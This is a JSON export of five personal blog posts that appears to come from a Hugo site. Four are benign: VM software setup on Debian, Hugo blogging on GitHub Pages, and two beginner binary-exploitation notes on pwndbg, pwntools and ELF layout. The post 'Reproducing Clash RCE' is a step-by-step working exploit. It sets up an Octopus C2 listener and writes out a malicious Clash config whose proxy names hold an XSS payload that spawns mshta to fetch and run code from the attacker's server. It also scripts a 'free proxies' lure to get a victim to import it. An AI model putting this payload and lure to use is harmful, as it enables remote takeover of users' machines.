[{"content":"Installing Virtual Machine Software on Debian Linux VirtualBox VirtualBox is relatively simple to install, and it is open-source and free, consuming fewer system resources.\nInstall the Latest Version of Kernel Headers/Kernel Images To avoid system issues due to an outdated kernel version, we need to avoid using the following common method:\nsudo apt-get install linux-headers-`uname -r` Instead, use the following commands:\nsudo apt update sudo apt-cache search linux-image sudo apt-get install linux-headers-xxx linux-image-xxx # replace xxx with the version number and system architecture from the above commands init 6 # reboot after installation apt Install VirtualBox apt-get install virtualbox virtualbox-guest-additions-iso VMware Workstation Compared to VBox, VMware is more cumbersome to set up.\nBut I have no choice\u0026hellip; I have more than 10 VMware virtual machines = =\nAhh.. Just felt too lazy to convert al of them\nInstall the Latest Version of Kernel Headers/Kernel Images The first step is the same as installing VBox.\nsudo apt update sudo apt-cache search linux-image sudo apt-get install linux-headers-xxx linux-image-xxx # replace xxx with the version number and system architecture from the above commands init 6 # reboot after installation Install Various Compilers sudo apt-get install build-essential Install VMware Workstation Download the installer from the official website.\nGive execute permission:\nchmod x VMware-Workstation-Full-version-number.bundle # TIP: You can use Tab to auto-complete long file names Run:\nsudo ./VMware-Workstation-Full-version-number.bundle To run the application, just type vmware in the terminal.\nTroubleshooting If everything goes smoothly, you can follow the prompts to finish this happy installation process.\nHowever, I encountered many more strange issues.\nVMware had problems compiling and installing the vmmom and vmnet modules. After trying various solutions, I finally decided to manually compile and install the two modules.\nHere are the specific solutions. You can refer to this official forum post.\nFirst, download the module\u0026rsquo;s source code.\nSince git clone didn\u0026rsquo;t work for some reason, we choose to download the zip file.\nAfter extracting the source code, navigate to the source code directory:\nunzip vmware-host-modules-workstation-16.2.1.zip cd vmware-host-modules-workstation-16.2.1 Compile and install:\nmake sudo make install Restart the VMware service:\nsudo systemctl restart vmware After completing these steps, you should be able to run VMware Workstation normally:\nvmware References Link 1 Link 2 Link 3 English translations by GPT-4\n","date":"2022-05-05T09:31:14-04:00","image":"https://kira-pgr.github.io/p/installing-virtual-machine-software-on-debian-linux/cover_hu5a0bff5542c2b4a2a99ba03dfc469cdd_192581_120x120_fill_q75_box_smart1.jpg","permalink":"https://kira-pgr.github.io/p/installing-virtual-machine-software-on-debian-linux/","title":"Installing Virtual Machine Software on Debian Linux"},{"content":"Clash For Windows RCE hat is RCE?\nFake answer: Reliable Computer Engineering\nIt actually stands for Remote Code Execution\nDisclaimer This article is PGR\u0026rsquo;s personal note on vulnerability reproduction, intended for reference/learning purposes only. Any loss caused by using the techniques in this article is solely the user\u0026rsquo;s responsibility\nPreparation Tip: Please use a Linux machine and a Windows machine, otherwise you may encounter issues\n(Don\u0026rsquo;t have Linux? Download Kali Linux)\nA Vulnerable Clash Windows Client Download Link\nDownload and install it on Windows as instructed\nC2 Tool Octopus Perform the following on a Linux system equipped with Python3 and Git\nIf not installed, please refer to:\nInstalling Git\nInstall Python3: Type sudo apt install python3 in the terminal\n(Since most systems came with these things preinstalled, search online for installation methods if you\u0026rsquo;re not using a deb-based system)\ngit clone https://github.com/mhaskar/Octopus.git cd Octopus pip install -r requirements.txt python3 octopus.py After successful installation, you should see the following interface\n┌─[askar@hackbook]─[/opt/redteaming/Octopus] └──╼ $python3 octopus.py ___ ___ ___ ___ ___ ___ / /\\ / /\\ ___ / /\\ / /\\ /__/\\ / /\\ / /::\\ / /:/ / /\\ / /::\\ / /::\\ \\ \\:\\ / /:/_ / /:/\\:\\ / /:/ / /:/ / /:/\\:\\ / /:/\\:\\ \\ \\:\\ / /:/ /\\ / /:/ \\:\\ / /:/ ___ / /:/ / /:/ \\:\\ / /:/~/:/ ___ \\ \\:\\ / /:/ /::\\ /__/:/ \\__\\:\\ /__/:/ / /\\ / /::\\ /__/:/ \\__\\:\\ /__/:/ /:/ /__/\\ \\__\\:\\ /__/:/ /:/\\:\\ \\ \\:\\ / /:/ \\ \\:\\ / /:/ /__/:/\\:\\ \\ \\:\\ / /:/ \\ \\:\\/:/ \\ \\:\\ / /:/ \\ \\:\\/:/~/:/ \\ \\:\\ /:/ \\ \\:\\ /:/ \\__\\/ \\:\\ \\ \\:\\ /:/ \\ \\::/ \\ \\:\\ /:/ \\ \\::/ /:/ \\ \\:\\/:/ \\ \\:\\/:/ \\ \\:\\ \\ \\:\\/:/ \\ \\:\\ \\ \\:\\/:/ \\__\\/ /:/ \\ \\::/ \\ \\::/ \\__\\/ \\ \\::/ \\ \\:\\ \\ \\::/ /__/:/ \\__\\/ \\__\\/ \\__\\/ \\__\\/ \\__\\/ \\__\\/ v1.2 stable ! Octopus C2 | Control your shells Octopus \u0026gt;\u0026gt; To run again, just enter:\npython3 octopus.py Apache2 For deb-based systems:\nsudo apt install apache2 For yum-based systems:\nsudo yum -y install httpd sudo firewall-cmd --permanent --add-port=80/tcp sudo firewall-cmd --permanent --add-port=443/tcp sudo firewall-cmd --reload For other systems, refer to the official website\nVulnerability Reproduction Linux (Attacking Machine) Open a terminal in the Octopus directory just downloaded\nType python3 octopus.py\nAfter entering the Octopus interface, enter the following\nlisten_http Your_Linux_IP 5555 Your_Linux_IP 5 AnyName.php Name generate_hta Name A little reminder\nGet IP: Type ifconfig in the terminal\nDon\u0026rsquo;t just blindly copy commands; you need to change the ip/name yourself\nNow Octopus is listening. Note down the link provided by Octopus and keep this terminal open (don\u0026rsquo;t close it)\nCreate a configuration file named RCE.yaml in the default directory of the Apache site /var/www/html/\nUse the following command:\nsudo vi RCE.yaml Enter the following content:\nport: 7890 socks-port: 7891 allow-lan: true mode: Rule log-level: info external-controller: :9090 proxies: - name: a\u0026lt;img/src=\u0026#34;1\u0026#34;/onerror=eval(\u0026#39;require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;mshta\u0026#34;,[\u0026#34;Octopus\u0026#39;s link \u0026#34;])\u0026#39;);\u0026gt; type: socks5 server: 127.0.0.1 port: \u0026#34;17938\u0026#34; skip-cert-verify: true - name: abc type: socks5 server: 127.0.0.1 port: \u0026#34;8088\u0026#34; skip-cert-verify: true proxy-groups: - name: \u0026lt;img/src=\u0026#34;1\u0026#34;/onerror=eval(\u0026#39;require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;mshta\u0026#34;,[\u0026#34;Octopus\u0026#39;s link\u0026#34;])\u0026#39;);\u0026gt; type: select proxies: - a\u0026lt;img/src=\u0026#34;1\u0026#34;/onerror=eval(\u0026#39;require(\u0026#34;child_process\u0026#34;).spawn(\u0026#34;mshta\u0026#34;,[\u0026#34;Octopus\u0026#39;s link\u0026#34;])\u0026#39;);\u0026gt; Principle: This is an XSS vulnerability. By inserting the payload into the Proxy\u0026rsquo;s name, arbitrary JS code execution is achieved. Here, it executes the command mshta with the parameter being the Octopus-generated hta link.\nPress Esc and type :wq to save and exit.\nAfterward, the attacker can wait for the victim to connect ;)\nVictim Machine (evil smirk)\nSimulating social engineering:\nHacker: \u0026ldquo;Do you want free proxies QAQ???\u0026rdquo;\nVictim: \u0026ldquo;Yes, please.\u0026rdquo;\nHacker: \u0026ldquo;Here\u0026rsquo;s what you need clash://install-config?url=xxx\u0026amp;name=RCE\u0026rdquo;\nOn any browser in Windows, enter\nclash://install-config?url=http://Your_Linux_IP/RCE.yaml\u0026amp;name=YourName Tip: Remember to change the IP and name\nThen, in the pop-up, click Open Clash For Windows\nGo to the Profiles page\nSelect FileName.yaml (here it is RCE.yaml)\nSwitch to the Proxies page and click on the a (this step is optional as this RCE is somewhat unstable)\nSuccessful Shell Acquisition Octopus receives the shell, allowing you to do whatever you want on the unfortunate Windows machine\nType interact 1 to execute any cmd command on that Windows machine. QWQ.\nPatch The official Clash team has already released a new version fixing the vulnerability\nDownload Link\nRef https://github.com/Fndroid/clash_for_windows_pkg/issues/2710\nCompiling and Installing - Apache HTTP Server Version 2.4\nGitHub - mhaskar/Octopus: Open source pre-operation C2 server based on python and powershell\nPart of translations by GPT-4\n","date":"2022-02-25T23:27:12-05:00","image":"https://kira-pgr.github.io/p/reproducing-clash-rce/cover_hu12a48eb127ba99e3f348b4c7f466d0c6_650772_120x120_fill_q75_box_smart1.jpg","permalink":"https://kira-pgr.github.io/p/reproducing-clash-rce/","title":"Reproducing Clash RCE"},{"content":"PWN! PWN! PANG! Part2 Introduction After covering the basics (which don\u0026rsquo;t seem very basic), let\u0026rsquo;s talk about tools today\nSince we are studying PWN under Linux, please perform the following operations under Linux\nWhat if you only have Windows?\nOption 1: Use VMware Workstation Pro to install a Linux virtual machine (This is what I did) Small Tip: Some Linux distributions (like Kali) can be downloaded as ready-made virtual machine files from their official websites. If you haven\u0026rsquo;t installed a VM before (or are too lazy to), this method is worth trying\nOption 2: Use WSL2 (Well, WSL2 is small in size and now comes with a GUI, but it\u0026rsquo;s not very comfortable to use compared with VMs) PWNDBG pwndbg is a plugin for Linux GDB specifically designed for PWN, which helps us debug programs\nInstallation Most Linux systems come with gdb pre-installed, but let\u0026rsquo;s just go over the installation process\nDebian-based systems\nsudo apt install gdb yum-based systems Just switch to Debian ;)\nsudo yum -y install centos-release-scl sudo yum-config-manager --enable rhel-server-rhscl-7-rpms sudo yum -y install devtoolset-7 scl enable devtoolset-7 bash After installing gdb, we can install pwndbg\ngit clone https://github.com/pwndbg/pwndbg.git cd pwndbg ./setup.sh Some Tips Related to Installation Note: Please do not delete or arbitrarily move the pwndbg directory, as it may cause pwndbg to not start properly\nIf pwndbg does not start properly after installation or a system update, please check the path\nsudo vi ~/.gdbinit After executing the command, you should see a line\nsource other_content/pwndbg/gdbinit.py Make sure to change the content after source to the path of gdbinit.py in your pwndbg folder\nTip: If you wish to stop using pwndbg, simply remove this line\nUsage Most of the usage is similar to gdb. Here are a few frequently used commands\nb function_name # set a breakpoint at a function b *address # set a breakpoint at an address r # run n # execute the next instruction or skip a function s # step into a function q # quit gdb As for the special features of pwndbg, they can be viewed using the pwndbg command\nPWNTOOLS This is a third-party Python library for pwn\nInstallation You can install pwntools simply using\npip install pwntools Don\u0026rsquo;t have pip? Hurry up and install Python 3!!! (Most Linux systems should have it pre-installed = = )\nUsage Use it just like any standard Python library\nfrom pwn import * Let me mention a few commonly used commands, qaq (others will be discussed as needed). Of course, it\u0026rsquo;s best to check the documentation\nio = process(\u0026#34;./program_name\u0026#34;) # Similar to \u0026#34;listening\u0026#34; to a local program with PWNTools, then use the \u0026#39;io\u0026#39; variable for data transmission io.send(\u0026#34;content\u0026#34;) # send data (no automatic newline at the end) io.sendline(\u0026#34;content\u0026#34;) # send a line of data (automatically adds a newline at the end) io.recv() io.recvline() # receive data, similar to the above two functions # Note: In the PWN process, it\u0026#39;s crucial to choose the above four commands based on the target program\u0026#39;s input/output functions, as these subtle differences could prevent you from getting a shell io.interactive() # switch to interactive mode, where we can \u0026#34;enjoy the acquired Shell PWN?PWN! Let\u0026rsquo;s Get Hands-On Experiences Task: Familiarize yourself with the use of pwntools\nLet\u0026rsquo;s run and see what this little program is all about ;)\nPS: If the terminal indicates insufficient permissions, please give the program executable permissions\nchmod +x tools\nOutput\nPwntools is such an awesome python module, right? Tell you a secret (only smart baby can see it) : Maybe I will tell you again when you clever than ELSEpush ...... The program says: Pwntools is a great python module and wants to tell us a secret that only smart people can see\nSo how can we see this so-called secret? Running it directly won\u0026rsquo;t show it ()\nBased on what we learned and the program\u0026rsquo;s output, we can deduce that we should use pwntools to view it\n$ python3 Python 3.9.9 (main, Jan 12 2022, 16:10:51) [GCC 11.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; Since the program has no input, only output, we have to use recv() or recvline() functions, qaq\nEXP:\nfrom pwn import * io = process(\u0026#34;./tools\u0026#34;) io.recvline() io.recvline() io.recvline() The whole process:\n$ python3 Python 3.9.9 (main, Jan 12 2022, 16:10:51) [GCC 11.2.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; from pwn import * \u0026gt;\u0026gt;\u0026gt; io = process(\u0026#34;./tools\u0026#34;) [x] Starting local process \u0026#39;./tools\u0026#39; [+] Starting local process \u0026#39;./tools\u0026#39;: pid 108320 \u0026gt;\u0026gt;\u0026gt; io.recvline() [*] Process \u0026#39;./tools\u0026#39; stopped with exit code 0 (pid 108320) b\u0026#39;Pwntools is such an awesome python module, right?n\u0026#39; \u0026gt;\u0026gt;\u0026gt; io.recvline() b\u0026#39;Tell you a secret (only smart baby can see it) :n\u0026#39; \u0026gt;\u0026gt;\u0026gt; io.recvline() b\u0026#39;ZmxhZ3tuMHRfZjRzdGVyX3Q2YW5feTB1fQo=rMaybe I will tell you again when you clever than ELSEpush ......n\u0026#39; \u0026gt;\u0026gt;\u0026gt; The END= = To Be Continued\u0026hellip;\nPart of the translations by GPT-4\n","date":"2022-01-29T21:35:29-05:00","image":"https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/cover_hu3d6209426f4a4882dd231c4242aff084_2839967_120x120_fill_q75_box_smart1.jpg","permalink":"https://kira-pgr.github.io/p/pwn-pwn-pang-part2---tool-usage/","title":"PWN! PWN! PANG! Part2 --- Tool Usage"},{"content":"Build your Blog for Free Using GitHub Pages Installation Environment (Linux) Installing Hugo yum system\nsudo yum install hugo -y Arch\nsudo pacman -S hugo deb system\nsudo apt install hugo Installing Git (Skip this part if pre-installed) yum system\nsudo yum install git Arch\nsudo pacman -Syu git deb system\nsudo apt install git Installation Environment (Windows) Installing Hugo https://gohugo.io/getting-started/installing/#less-technical-users\nInstalling Git winget install Git.Git Start Building the Website.UwU.! Creating a GitHub Project Register/Login to GitHub P.S. Due to some reasons, GitHub may be inaccessible in certain areas in China.\nSolution: Use a VPN or switch to Gitee (requires real-name authentication).\nCreate a project named YourGithubUsername.github.io.\nKeep it for later use.\nBuilding Website Locally Note: My local environment is Kali Linux. The steps may vary in other environments.\nOpen the terminal/cmd/whatever and type:\nhugo new site NameOfYourWebsite Now Hugo will generate a website for you.\nAhem, next, visit https://themes.gohugo.io/ to find a theme you like.\nNavigate to the themes directory of your local hugo website.\ncd WebsiteName/themes Then place your theme inside.\ngit clone URLofYourThemeFromGitHub.git Once the theme is in place, follow the documentation to configure your site.\nDocumentation for Stack theme: https://docs.stack.jimmycai.com/zh/\nBasic Configuration for the Stack Theme Copy YourWebsiteName/themes/hugo-theme-stack/exampleSite/config.yaml to the root directory of the website (i.e., the YourWebsiteName directory).\nDelete config.toml from the website root directory.\nOpen config.yaml in the website root directory and fill in the details.\nTips:\nThe author\u0026rsquo;s avatar goes in /themes/hugo-theme-stack/assets/img/.\nAbout the emoji below the avatar: If you don\u0026rsquo;t want to add it, leave the line for emoji empty.\nStack Troubleshooting Edit:\nWell\u0026hellip; since I posted this article, many have become \u0026ldquo;Stack enthusiasts\u0026rdquo;.\nGiven the theme\u0026rsquo;s popularity, I\u0026rsquo;ll share more insights about my configuration experience.\nQ1: What if posts don\u0026rsquo;t appear on the homepage? Edit config.yaml in the website root directory.\nparams: mainSections: - posts Q2: How to configure comments? I chose Gitalk for comments.\ncomments: enabled: true # set to true to enable comments provider: gitalk Gitalk configuration:\ngitalk: owner: YourGitHubUsername admin: YourGitHubUsername repo: YourGitHubRepositoryName (NOTE: not the URL!!!!!!!) clientID: clientSecret: #DO NOT share your ClientID and ClientSecret! How to get ClientID and ClientSecret:\nGo to GitHub developer settings and create a new OAuth App.\nFill in the required fields:\nApplication Name: Any name\nHomepage URL: Your blog\u0026rsquo;s URL\nApplication description: Any description\nAuthorization callback URL: Your blog\u0026rsquo;s URL\nEnable Device Flow: Do NOT tick\nAfter saving, you will receive the ClientID. Click Generate a new client secret below the Client Secret box.\nNote: You can only see the Client Secret once.\nQ3: Customization and Beautification I don\u0026rsquo;t find much need for customization; usually, it\u0026rsquo;s just about adding quirky stuff. Still, let\u0026rsquo;s discuss it.\nPaths related to customization:\nWebsiteRootDirectory/layouts/partials/head/custom.html # HTML inserted at the head of all pages WebsiteRootDirectory/layouts/partials/footer/custom.html # HTML inserted at the footer of all pages WebsiteRootDirectory/static/ # Path for resource files like js, css, etc. Lastly, here\u0026rsquo;s a lazy method I wrote for beautifying Stack blogs: Link\nRun the website locally Open terminal/cmd/your preferred command-line tool in the website root directory.\nType:\nhugo server You can now visit http://127.0.0.1:1313/ in your local browser to see your website.\nWriting Blogs About Markdown Familiarize yourself with Markdown syntax before writing blogs.\nTip: You can use MarkText (an open-source markdown editor) for blogging. It offers a more comfortable experience.\n(I used this tool to write this article)\nMarkText download link\nAbout Directory Structure Your articles are in WebsiteRootDirectory/content/posts/.\nYour \u0026ldquo;categories\u0026rdquo; are in WebsiteRootDirectory/content/categories.\nGive it a try! First, create an md file. Open terminal/cmd/\u0026hellip; in the website root directory and type:\nhugo new posts/AnyNameYouLike/index.md Open index.md and replace the autogenerated content with:\n--- title: \u0026#34;Article Title\u0026#34; description: \u0026#34;Description\u0026#34; date: 2022-01-29T02:02:45-05:00 image: \u0026#34;ImageNameInSameDirectory(with file extension and relative path)\u0026#34; categories: - Category1 - Category2 tags: - Tag1 - Tag2 --- NOTE: Different themes might have different formats. Check the documentation if you\u0026rsquo;re not using the Stack theme.\nYou can now start writing the article content.\nTip: Place referenced images in the same directory.\nPublishing the Website on GitHub Whew, once you complete this step, your website will be publicly accessible.\nNOTE: Keep the local environment. You\u0026rsquo;ll need it for future blog posts.\nPublishing the Website Open terminal/cmd/and so on in the website root directory. Type:\nhugo --theme=ThemeDirectoryName Navigate to WebsiteRootDirectory/public.\ncd public Create a .git directory in public:\ngit init Add all files to the git repository:\ngit add . Commit:\ngit commit -m \u0026#34;Initial commit\u0026#34; Note: If your commit failed, it might be due to git not being properly configured. Fix it by following the steps:\ngit config --global user.email \u0026#34;you@example.com\u0026#34; git config --global user.name \u0026#34;Your Name\u0026#34; Then retry the commit.\nConnect your repository to the website:\ngit remote add origin https://github.com/YourGitHubUsername/YourGitHubUsername.github.io.git Push to GitHub:\ngit push -u origin master Wait for a while and then visit https://YourGitHubUsername.github.io/ to see your website!\nCongratulations! Your Hugo blog is now live on GitHub!\nRef 如何使用 GitHub 搭建博客 - WeepingDogel\nhttps://docs.stack.jimmycai.com/zh/\nEnglish translations by GPT-4\n","date":"2022-01-29T02:02:45-05:00","image":"https://kira-pgr.github.io/p/hugo-personal-blog-without-a-server/cover_hu8faceda538ccec36a41e941e68707cfc_3003908_120x120_fill_q75_box_smart1.jpg","permalink":"https://kira-pgr.github.io/p/hugo-personal-blog-without-a-server/","title":"Hugo Personal Blog without a Server"},{"content":"PWN! PWN! PANG! Part1 Foreword Here are the PGR\u0026rsquo;s basic PWN learning notes, mainly studying the exploitation of vulnerabilities in ELF executable files under Linux\nThe content involves:\nStack vulnerability exploitation, mainly stack overflow attacks PS: Speaking of Stack Overflow, we must mention a famous IT forum of the same name abroad (it\u0026rsquo;s extremely, extremely, extremely useful)\nImportant things must be said three times XD\nhttps://stackoverflow.com/\nFormat String vulnerabilities in the C language Printf() function\nA little bit of heap exploitation\nWhat is PWN? PWN originally meant the \u0026ldquo;bang\u0026rdquo; sound when a hacker broke into a system. Here, we interpret it as binary vulnerability mining and exploitation\nTo explain step by step = = It can be summarized as the following points:\nCrack and exploit successfully (binary vulnerabilities of the program)\nBreak into (devices, servers)\nControl (devices, servers)\nELF Files Under Linux ELF files are executable files under Linux, they\u0026rsquo;re different from exe files under Windows\nYou can use the File command to check your file format:\nHowever, there is an interesting point here. Since the File command judges the file type based on the file header, the file suffix does not affect its judgment of the file as an ELF file (even if a.out has been changed to a.zip)\nHowever, if you double-click this .zip in the folder window, you will find that: this ELF file has been opened as a compressed file (this seems very similar to Windows)\nIt can be seen that in the process of changing the suffix, it has interfered with the system\u0026rsquo;s recognition of the file opening method = =\nStructure of ELF Files Seems we went off-topic = =\nNow let\u0026rsquo;s take another look at this executable file \u0026ldquo;a.out\u0026rdquo;\nWe just accidentally opened it as a compressed file (as shown above)\nWe see a bunch of strange files:\n.got\n.got.plt\n.plt\n.text\n\u0026hellip;\nThese files actually represent the various \u0026ldquo;sections\u0026rdquo; of this ELF file on the disk\nAnd when the ELF is mapped into memory, there are \u0026ldquo;segments\u0026rdquo;\nSegments and Sections Here, let\u0026rsquo;s talk in detail about segments and sections\n(Well = =, because I personally feel this knowledge has a big impact on later learning)\nHere\u0026rsquo;s an important diagram:\nFrom this diagram, we can see that the .data, .bss, and .got.plt sections are all mapped to the Data Segment\nWhile .rodata, .text, .init, ELF Header are mapped to the Code Segment\nWhy?\nThe first three sections (too lazy to write in detail) have a common feature: readable and writable. Because user data is saved here, it obviously can\u0026rsquo;t be non-writable = = . Obviously, you also can\u0026rsquo;t let it be executable, otherwise users can write any data and execute it (never trust user input is safe)\nThe latter four sections are code parts, which are often little programs of their own, so they are readable and executable, but not writable = =\nLastly, \u0026gt;__\u0026lt;, here\u0026rsquo;s another diagram;)\nOrganization of Program Data in Memory Straight to the diagram()\nLet\u0026rsquo;s assume everyone has a bit of C foundation here\nNot going off-topic anymore\nA few points to note here\nThe stack grows downward from high to low address\nThe heap grows from low to high address\nData is written from low to high address\nBSS stores global variables\nThe stack stores local variables\nAssembly Alert! For assembly, you only need to know the most basic instructions = =\nSince we\u0026rsquo;ve written so much = =\nLet\u0026rsquo;s continue\u0026hellip;\nSome Common Assembly Instructions\nUsage\nMOV DEST(ADDRESS), SRC(VALUE) ; Transfer the source operand to the destination (similar to an assignment statement) LEA REG, SRC ; Send the effective address of the source operand to the specified register (save SRC\u0026#39;s address into…) PUSH VALUE ; Push the target value onto the stack, while decreasing the SP pointer by 1 word length POP DEST ; Pop the value from the top of the stack to the destination storage position, while increasing the SP pointer by 1 word length LEAVE ; Instruction to restore the parent function\u0026#39;s stack frame when returning from a function (destroy the child function\u0026#39;s stack frame after the child function call ends) RET ; Instruction to control the program execution flow to return to the parent function when returning from a function Reference translations by GPT-4\n","date":"2022-01-27T21:24:46-05:00","image":"https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/cover_hu576b02bd11baef12c82f0e62b58bf2a0_136072_120x120_fill_q75_box_smart1.jpg","permalink":"https://kira-pgr.github.io/p/pwn-pwn-pang-part1---basic-knowledge/","title":"PWN! PWN! PANG! Part1---Basic Knowledge"}]